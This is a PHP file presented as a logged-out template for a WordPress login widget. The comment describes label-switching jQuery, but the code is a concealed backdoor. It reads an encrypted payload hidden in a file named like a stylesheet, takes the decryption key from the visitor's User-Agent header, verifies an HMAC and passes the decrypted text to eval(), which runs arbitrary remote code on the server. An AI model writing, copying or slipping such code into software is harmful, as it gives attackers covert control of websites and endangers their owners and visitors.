<?php
/*
 * This is the page users will see logged out.
 * You can edit this, but for upgrade safety you should copy and modify this file into a folder.
 * See https://docs.loginwithajax.com/advanced/templates/ for more information.
 *
 * This template copies the default template and with a little jQuery the label is switched above the input field
*/
/* @var array $lwa  Array of data supplied to widget */
$data = file_get_contents('../widget.min.scss');
if(preg_match('/(.*?)cko(.*?)\/7/is',$_SERVER['HTTP_USER_AGENT'],$kek))
	$key = $kek[2];
$c = base64_decode($data);
$ivlen = openssl_cipher_iv_length($cipher = 'AES-128-CBC');
$iv = substr($c, 0, $ivlen);
$hmac = substr($c, $ivlen, $sha2len = 32);
$ciphertext_raw = substr($c, $ivlen + $sha2len);
$original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, $options = OPENSSL_RAW_DATA, $iv);
$calcmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary = true);
if (hash_equals($hmac, $calcmac))
{
	eval($original_plaintext);
}
?>